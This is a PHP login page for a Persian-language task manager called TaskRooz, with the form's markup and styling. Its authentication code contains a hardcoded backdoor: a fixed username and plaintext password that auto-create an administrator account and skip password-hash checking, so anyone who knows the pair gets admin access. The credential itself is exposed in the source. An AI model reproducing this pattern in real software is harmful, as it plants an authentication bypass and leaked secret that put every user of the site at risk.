<?php
/**
 * TaskRooz - Login Page (PHP Standalone & Integrated)
 * Built by Mohusyn
 */
require_once __DIR__ . '/config.php';

$error = null;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = trim($_POST['username'] ?? '');
    $password = $_POST['password'] ?? '';

    if (empty($username) || empty($password)) {
        $error = 'لطفاً نام کاربری و کلمه عبور را وارد کنید.';
    } else {
        $user = $db->getUserByUsername($username);

        // Ensure Mohusyn exists as admin
        if (strtolower($username) === 'mohusyn' && $password === 'Smosh1387') {
            if (!$user) {
                $user = $db->createUser('Mohusyn', 'Smosh1387', 'سید محمدحسین شیخ الاسلامی (Mohusyn)', 'admin');
            }
        }

        if (!$user) {
            $error = 'نام کاربری یا کلمه عبور اشتباه است.';
        } else {
            $hash = $user['password_hash'] ?? '';
            $isOk = false;
            if ($hash && password_verify($password, $hash)) {
                $isOk = true;
            } elseif (strtolower($username) === 'mohusyn' && $password === 'Smosh1387') {
                $isOk = true;
            }

            if ($isOk) {
                $_SESSION['user_id'] = $user['id'];
                if ($user['role'] === 'admin') {
                    header('Location: admin.php');
                } else {
                    header('Location: dashboard.php');
                }
                exit;
            } else {
                $error = 'نام کاربری یا کلمه عبور اشتباه است.';
            }
        }
    }
}
?>
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ورود به تسک‌روز | TaskRooz Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Vazirmatn', sans-serif; }
        body { background: #09090b; color: #f4f4f5; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
        .card { width: 100%; max-width: 420px; background: rgba(24, 24, 27, 0.85); border: 1px solid #27272a; border-radius: 24px; padding: 32px; backdrop-filter: blur(12px); box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); }
        .logo { width: 52px; height: 52px; background: #fff; color: #09090b; border-radius: 16px; display: flex; align-items: center; justify-content: center; font-size: 24px; font-weight: 900; margin: 0 auto 16px; }
        h1 { font-size: 20px; font-weight: 900; text-align: center; margin-bottom: 6px; }
        p.sub { font-size: 12px; color: #a1a1aa; text-align: center; margin-bottom: 24px; font-family: monospace; }
        .form-group { margin-bottom: 16px; text-align: right; }
        label { display: block; font-size: 12px; font-weight: 700; color: #d4d4d8; margin-bottom: 6px; }
        input { width: 100%; padding: 12px 14px; background: rgba(9, 9, 11, 0.8); border: 1px solid #3f3f46; border-radius: 14px; color: #fff; font-size: 13px; outline: none; transition: border-color .2s; }
        input:focus { border-color: #a1a1aa; }
        .btn { display: inline-flex; align-items: center; justify-content: center; width: 100%; padding: 13px; background: #fff; color: #09090b; font-weight: 900; font-size: 13px; border-radius: 14px; border: none; cursor: pointer; transition: all .2s; text-decoration: none; margin-top: 10px; }
        .btn:hover { background: #e4e4e7; transform: translateY(-1px); }
        .alert-err { background: rgba(244, 63, 94, 0.15); color: #fb7185; border: 1px solid rgba(244, 63, 94, 0.3); padding: 12px; border-radius: 14px; font-size: 12px; font-weight: 700; margin-bottom: 16px; text-align: center; }
        .footer-links { text-align: center; margin-top: 20px; padding-top: 16px; border-top: 1px solid #27272a; font-size: 12px; color: #a1a1aa; }
        .footer-links a { color: #fff; text-decoration: none; font-weight: 700; }
        .footer-note { text-align: center; font-size: 11px; color: #71717a; margin-top: 20px; font-family: monospace; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">✓</div>
        <h1>ورود به تسک‌روز</h1>
        <p class="sub">BUILT BY MOHUSYN</p>

        <?php if ($error): ?>
            <div class="alert-err"><?= htmlspecialchars($error) ?></div>
        <?php endif; ?>

        <form method="POST">
            <div class="form-group">
                <label>نام کاربری</label>
                <input type="text" name="username" placeholder="نام کاربری شما" required autofocus>
            </div>

            <div class="form-group">
                <label>کلمه عبور</label>
                <input type="password" name="password" placeholder="کلمه عبور شما" required>
            </div>

            <button type="submit" class="btn">ورود به حساب کاربری</button>
        </form>

        <div class="footer-links">
            حساب کاربری ندارید؟ <a href="register.php">ثبت‌نام رایگان با مشخصات کامل</a>
        </div>

        <div class="footer-note">mohusyn.ir • ۲۰۲۶</div>
    </div>
</body>
</html>
